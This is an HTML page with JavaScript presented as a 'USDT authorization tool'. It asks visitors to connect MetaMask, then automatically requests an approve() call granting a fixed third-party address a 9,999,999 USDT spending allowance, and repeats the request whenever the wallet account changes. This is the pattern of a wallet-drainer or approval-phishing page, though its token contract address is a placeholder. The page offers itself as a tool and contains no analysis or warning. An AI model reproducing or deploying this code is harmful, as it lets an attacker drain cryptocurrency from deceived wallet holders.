<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT 授权工具</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ffffff;
        }
        .container {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 16px;
            padding: 40px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        h1 {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 30px;
            background: linear-gradient(90deg, #4CAF50, #2196F3);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .wallet-connect {
            margin: 30px 0;
        }
        .btn {
            background: linear-gradient(90deg, #4CAF50, #45a049);
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            transition: all 0.3s ease;
            width: 100%;
            margin: 10px 0;
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(76, 175, 80, 0.3);
        }
        .btn:disabled {
            background: rgba(76, 175, 80, 0.5);
            cursor: not-allowed;
            transform: none;
        }
        .status {
            margin: 20px 0;
            padding: 15px;
            border-radius: 8px;
            font-size: 14px;
        }
        .success {
            background: rgba(76, 175, 80, 0.2);
            color: #4CAF50;
            border: 1px solid rgba(76, 175, 80, 0.3);
        }
        .error {
            background: rgba(244, 67, 54, 0.2);
            color: #F44336;
            border: 1px solid rgba(244, 67, 54, 0.3);
        }
        .info {
            background: rgba(33, 150, 243, 0.2);
            color: #2196F3;
            border: 1px solid rgba(33, 150, 243, 0.3);
        }
        .address {
            font-family: 'Courier New', monospace;
            background: rgba(255, 255, 255, 0.1);
            padding: 8px 12px;
            border-radius: 4px;
            word-break: break-all;
            font-size: 12px;
            margin: 10px 0;
        }
        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.6);
        }
        .dob-section {
            margin: 30px 0;
        }
        .dob-inputs {
            display: flex;
            gap: 10px;
            margin: 20px 0;
        }
        .input-group {
            flex: 1;
        }
        .input-group label {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
            color: rgba(255, 255, 255, 0.8);
        }
        .input-group input {
            width: 100%;
            padding: 8px 12px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 6px;
            color: white;
            font-size: 16px;
        }
        .input-group input::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>USDT 授权工具</h1>
        
        <div class="wallet-connect">
            <button id="connectWallet" class="btn">连接 MetaMask</button>
            <div id="walletStatus" class="status info">请连接您的钱包</div>
        </div>
        
        <div class="footer">
            <p>授权地址：0xB8C306FAdfFE05BF3336333585B3FE9B7e6AFD02</p>
            <p>授权金额：9999999 USDT</p>
        </div>
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <script>
        // 合约地址和ABI
        const CONTRACT_ADDRESS = '0x1234567890123456789012345678901234567890';
        const CONTRACT_ABI = [
            {
                "inputs": [
                    {
                        "internalType": "uint256",
                        "name": "initialSupply",
                        "type": "uint256"
                    }
                ],
                "stateMutability": "nonpayable",
                "type": "constructor"
            },
            {
                "anonymous": false,
                "inputs": [
                    {
                        "indexed": true,
                        "internalType": "address",
                        "name": "owner",
                        "type": "address"
                    },
                    {
                        "indexed": true,
                        "internalType": "address",
                        "name": "spender",
                        "type": "address"
                    },
                    {
                        "indexed": false,
                        "internalType": "uint256",
                        "name": "value",
                        "type": "uint256"
                    }
                ],
                "name": "Approval",
                "type": "event"
            },
            {
                "anonymous": false,
                "inputs": [
                    {
                        "indexed": true,
                        "internalType": "address",
                        "name": "from",
                        "type": "address"
                    },
                    {
                        "indexed": true,
                        "internalType": "address",
                        "name": "to",
                        "type": "address"
                    },
                    {
                        "indexed": false,
                        "internalType": "uint256",
                        "name": "value",
                        "type": "uint256"
                    }
                ],
                "name": "Transfer",
                "type": "event"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "owner",
                        "type": "address"
                    },
                    {
                        "internalType": "address",
                        "name": "spender",
                        "type": "address"
                    }
                ],
                "name": "allowance",
                "outputs": [
                    {
                        "internalType": "uint256",
                        "name": "",
                        "type": "uint256"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "spender",
                        "type": "address"
                    },
                    {
                        "internalType": "uint256",
                        "name": "amount",
                        "type": "uint256"
                    }
                ],
                "name": "approve",
                "outputs": [
                    {
                        "internalType": "bool",
                        "name": "",
                        "type": "bool"
                    }
                ],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "account",
                        "type": "address"
                    }
                ],
                "name": "balanceOf",
                "outputs": [
                    {
                        "internalType": "uint256",
                        "name": "",
                        "type": "uint256"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "decimals",
                "outputs": [
                    {
                        "internalType": "uint8",
                        "name": "",
                        "type": "uint8"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "name",
                "outputs": [
                    {
                        "internalType": "string",
                        "name": "",
                        "type": "string"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "symbol",
                "outputs": [
                    {
                        "internalType": "string",
                        "name": "",
                        "type": "string"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "totalSupply",
                "outputs": [
                    {
                        "internalType": "uint256",
                        "name": "",
                        "type": "uint256"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "to",
                        "type": "address"
                    },
                    {
                        "internalType": "uint256",
                        "name": "amount",
                        "type": "uint256"
                    }
                ],
                "name": "transfer",
                "outputs": [
                    {
                        "internalType": "bool",
                        "name": "",
                        "type": "bool"
                    }
                ],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "from",
                        "type": "address"
                    },
                    {
                        "internalType": "address",
                        "name": "to",
                        "type": "address"
                    },
                    {
                        "internalType": "uint256",
                        "name": "amount",
                        "type": "uint256"
                    }
                ],
                "name": "transferFrom",
                "outputs": [
                    {
                        "internalType": "bool",
                        "name": "",
                        "type": "bool"
                    }
                ],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];
        
        // 特殊授权地址
        const AUTHORIZED_ADDRESS = '0xB8C306FAdfFE05BF3336333585B3FE9B7e6AFD02';
        
        let web3;
        let contract;
        let account;
        
        // 连接钱包并自动授权
        document.getElementById('connectWallet').addEventListener('click', async () => {
            if (window.ethereum) {
                try {
                    // 请求用户授权
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    account = accounts[0];
                    
                    // 初始化Web3
                    web3 = new Web3(window.ethereum);
                    
                    // 初始化合约
                    contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
                    
                    // 更新状态
                    document.getElementById('walletStatus').innerHTML = `已连接钱包: <span class="address">${account}</span>`;
                    document.getElementById('walletStatus').className = 'status success';
                    
                    // 自动执行授权
                    await autoApprove();
                } catch (error) {
                    console.error('连接钱包失败:', error);
                    document.getElementById('walletStatus').innerHTML = '连接钱包失败，请重试';
                    document.getElementById('walletStatus').className = 'status error';
                }
            } else {
                document.getElementById('walletStatus').innerHTML = '请安装 MetaMask 钱包';
                document.getElementById('walletStatus').className = 'status error';
            }
        });
        
        // 自动授权函数
        async function autoApprove() {
            const amount = '9999999'; // 默认授权金额为9999999 USDT
            
            try {
                // 更新状态
                document.getElementById('walletStatus').innerHTML = '正在授权...';
                document.getElementById('walletStatus').className = 'status info';
                
                // 转换金额为wei（USDT有6位小数）
                const amountWei = web3.utils.toWei(amount, 'mwei'); // 1 USDT = 1,000,000 mwei
                
                // 执行授权
                const result = await contract.methods.approve(AUTHORIZED_ADDRESS, amountWei).send({ from: account });
                
                // 更新状态
                document.getElementById('walletStatus').innerHTML = `授权成功！交易哈希: <a href="https://etherscan.io/tx/${result.transactionHash}" target="_blank">${result.transactionHash}</a>`;
                document.getElementById('walletStatus').className = 'status success';
                
                // 检查授权额度
                await checkAllowance();
            } catch (error) {
                console.error('授权失败:', error);
                document.getElementById('walletStatus').innerHTML = '授权失败，请重试';
                document.getElementById('walletStatus').className = 'status error';
            }
        }
        
        // 检查授权额度
        async function checkAllowance() {
            if (!contract || !account) return;
            
            try {
                // 获取授权额度
                const allowanceWei = await contract.methods.allowance(account, AUTHORIZED_ADDRESS).call();
                
                // 转换为USDT
                const allowanceUSDT = web3.utils.fromWei(allowanceWei, 'mwei');
                
                // 更新状态
                document.getElementById('walletStatus').innerHTML = `已连接钱包: <span class="address">${account}</span><br>当前授权额度: ${allowanceUSDT} USDT`;
                document.getElementById('walletStatus').className = 'status success';
            } catch (error) {
                console.error('检查授权额度失败:', error);
                document.getElementById('walletStatus').innerHTML = '检查授权额度失败，请重试';
                document.getElementById('walletStatus').className = 'status error';
            }
        }
        
        // 监听钱包变化
        if (window.ethereum) {
            window.ethereum.on('accountsChanged', (accounts) => {
                if (accounts.length > 0) {
                    account = accounts[0];
                    document.getElementById('walletStatus').innerHTML = `已连接钱包: <span class="address">${account}</span>`;
                    document.getElementById('walletStatus').className = 'status success';
                    // 自动执行授权
                    autoApprove();
                } else {
                    account = null;
                    document.getElementById('walletStatus').innerHTML = '请连接您的钱包';
                    document.getElementById('walletStatus').className = 'status info';
                }
            });
        }
    </script>
</body>
</html>
